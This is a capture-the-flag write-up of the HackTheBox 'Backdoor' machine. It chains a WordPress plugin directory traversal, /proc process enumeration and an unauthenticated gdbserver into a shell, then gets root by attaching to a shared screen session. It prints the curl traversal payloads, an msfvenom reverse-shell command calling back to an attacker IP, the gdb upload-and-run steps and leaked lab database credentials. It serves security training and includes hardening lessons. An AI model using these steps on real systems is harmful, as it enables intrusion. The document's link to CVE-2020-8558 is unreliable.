---
title: "Backdoor"
date: 2021-11-27
type: docs
tags:
  - htb
  - linux
  - easy
  - wordpress
  - directory-traversal
  - lfi
  - proc-enumeration
  - gdbserver
  - cve-2020-8558
  - screen
  - shared-screen-session
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu), **Difficulty:** Easy, **Released:** 2021-11-27, **IP:** `10.10.11.125` → `backdoor.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. WordPress 5.8.1 on `:80` + an unknown service on **1337**. The **`ebook-download`** plugin is vulnerable to **directory traversal** (`filedownload.php?ebookdownloadurl=../../../wp-config.php`).
2. Turn the traversal into a general LFI: read `/proc/sched_debug` and `/proc/<pid>/cmdline` to enumerate running processes → discover **`gdbserver`** bound to **1337**.
3. `gdbserver` with no auth lets a remote GDB client upload and `run` an ELF → generate a reverse-shell ELF with `msfvenom`, `target extended-remote 10.10.11.125:1337`, `run` → shell as **`user`**.
4. Root: a cron runs GNU **`screen`** as root with a predictable session name. `screen -x root/root` attaches to it → root shell.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `wp-config.php` DB creds (not needed for the path) | `wordpressuser : MQYBJSaD#DxG6qbm` |
| `user.txt` | `/home/user/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Backdoor teaches **turning a limited file read into process discovery**. The plugin traversal only gives you files, but Linux exposes the entire process table as files under `/proc`, so a file read primitive becomes "what is running and with what arguments", which is how you find the otherwise-anonymous `gdbserver` on 1337. The `gdbserver` step is a clean, memorable primitive: an unauthenticated remote debugging daemon *is* remote code execution by design. Root is the classic **shared `screen` socket** attach.

Related LFI/traversal boxes: [Inject](/writeups/hackthebox/linux/easy/inject/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related `/proc` enumeration: [Jupiter](/writeups/hackthebox/linux/medium/jupiter/). Related unusual-service RCE: [Antique](/writeups/hackthebox/linux/easy/antique/) (JetDirect `exec`), [PC](/writeups/hackthebox/linux/easy/pc/) (gRPC). Related `screen`/`tmux` root sockets: [CyberCrafted](/writeups/tryhackme/linux/medium/cybercrafted/).

---

## Full Walkthrough

### Recon

```console
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
| http-enum:
|   /wp-login.php: Wordpress login page.
|   /: WordPress version: 5.8.1
1337/tcp open     unknown
2605/tcp filtered bgpd
```

(The nmap `vulners` script dumped ~90 CVE references for the SSH and Apache versions. None of them are the path; trimmed here.)

WPScan / `http-wordpress-users` confirms a single user `admin`. `dirsearch` shows a standard WP layout with `/wp-config.php` present but returning `0B` (PHP-parsed, so no source via a normal request).

`http://backdoor.htb/wp-links-opml.php` renders XML with a `<!-- generator="WordPress/5.8.1" -->` comment. The service on **1337** answers but says nothing:

```console
❯ nc backdoor.htb 1337 -vv
backdoor.htb [10.10.11.125] 1337 (menandmice-dns) open
```

`menandmice-dns` is just nmap's guess from the port number. Ignore it.

### Plugin directory traversal

Browsing `http://backdoor.htb/wp-content/plugins/` (directory listing is on) reveals **`ebook-download`**.

<div class="callout callout-note">

**`ebook-download` traversal (EDB-39575)**

The plugin's `filedownload.php` takes an `ebookdownloadurl` parameter and streams whatever path it points to, with **no traversal filtering and no auth**. `?ebookdownloadurl=../../../wp-config.php` walks out of the plugin folder to the WordPress root. Because the file is *streamed as a download* rather than executed, you get the raw PHP source, including DB credentials that a normal request would never show. The response is prefixed with the payload string echoed a few times (the plugin's own bug); strip that off.

</div>

```bash
curl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
```

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
define( 'DB_HOST', 'localhost' );
```

The DB creds don't lead anywhere directly (MySQL isn't exposed), so use the traversal as a **generic LFI**. A browser adds a `<script>window.close()</script>` because of the plugin's `Content-Disposition` weirdness; `curl` avoids that. Reading `/etc/passwd` confirms the primitive works and shows a `user` account.

### `/proc` → find `gdbserver`

```bash
# how many PIDs? read the scheduler debug file
curl -s 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/sched_debug'

# then loop /proc/<pid>/cmdline for each
for i in $(seq 1 2000); do
  echo -n "PID $i: "
  curl -s "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$i/cmdline" | tr '\0' ' '
  echo
done | grep -a gdbserver
```

```console
PID 8xx: /usr/bin/gdbserver --once 0.0.0.0:1337 /bin/true
```

<div class="callout callout-note">

**Enumerating processes through an LFI**

`/proc/<pid>/cmdline` is the null-separated argv of a running process, world-readable for your own and often for others. `/proc/sched_debug` and `/proc/<pid>/status` give you the PID list to iterate. This converts *any* file-read bug into `ps aux`. Invaluable for spotting internal services, cron jobs, and credentials passed on the command line. Also try `/proc/<pid>/environ`, `/proc/<pid>/cwd`, `/proc/net/tcp`.

</div>

### `gdbserver` → shell as `user`

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.26 LPORT=9001 -f elf -o rev.elf
```

```console
❯ gdb -q
(gdb) target extended-remote 10.10.11.125:1337
(gdb) remote put rev.elf /tmp/rev.elf
(gdb) set remote exec-file /tmp/rev.elf
(gdb) run
```

`nc -lvnp 9001` catches a shell as `user`; grab `user.txt`.

<div class="callout callout-note">

**Unauthenticated `gdbserver` = RCE (relates to CVE-2020-8558-style exposure)**

`gdbserver host:port /program` opens a debugging stub with **no authentication**. Any GDB client that connects can upload a file (`remote put`), set it as the exec target, and `run` it. Arbitrary code execution as whatever user launched `gdbserver` (here `user`, via a cron with `--once`). Never expose `gdbserver` on a routable interface; bind it to `127.0.0.1` and tunnel over SSH.

</div>

### Privilege Escalation. Shared `screen` session

`linpeas` / manual enumeration shows a root process running `screen`, and a cron restarting it. GNU `screen` sessions can be *attached to* by name if the socket permissions allow it (SUID-root `screen`, or a multiuser session):

```bash
screen -x root/root
```

```console
root@Backdoor:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# cat /root/root.txt
```

<div class="callout callout-note">

**Why the attach works**

On Backdoor, `screen` is SUID root and a root-owned detached session named `root` exists (recreated by cron). `screen -x <user>/<session>` attaches to another user's session; with SUID `screen` the socket in `/run/screen/S-root` is reachable and you drop straight into root's live terminal. The general lesson: SUID `screen`/`tmux` plus any attacker-reachable session name is game over. Same idea on [CyberCrafted](/writeups/tryhackme/linux/medium/cybercrafted/).

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/user/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **A file-read bug is a process-enumeration bug** thanks to `/proc`. Always pivot LFI → `/proc/<pid>/cmdline` / `environ`.
- **Turn off directory listing** and remove unused WordPress plugins. `ebook-download` was abandoned years ago.
- **Never expose `gdbserver`** (or any debugger stub) on `0.0.0.0`.
- **SUID `screen`/`tmux` is dangerous.** Remove the SUID bit; if you need multiuser screen, lock it down with `aclchg`.
- Use `curl`, not a browser, when a "download" endpoint injects HTML/JS into the response.

---

## Related Writeups

- **LFI / path traversal:** [Inject](/writeups/hackthebox/linux/easy/inject/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **`/proc` process enumeration:** [Jupiter](/writeups/hackthebox/linux/medium/jupiter/)
- **Unusual service → RCE:** [Antique](/writeups/hackthebox/linux/easy/antique/), [PC](/writeups/hackthebox/linux/easy/pc/)
- **Shared `screen` / `tmux` socket to root:** [CyberCrafted](/writeups/tryhackme/linux/medium/cybercrafted/)
- **WordPress footholds:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Smol](/writeups/tryhackme/linux/medium/smol/), [Avenger](/writeups/tryhackme/windows/medium/avenger/)

## References

- ebook-download traversal <https://www.exploit-db.com/exploits/39575>
- gdbserver remote protocol <https://sourceware.org/gdb/current/onlinedocs/gdb/Remote-Protocol.html>
- GTFOBins: screen <https://gtfobins.github.io/gtfobins/screen/>
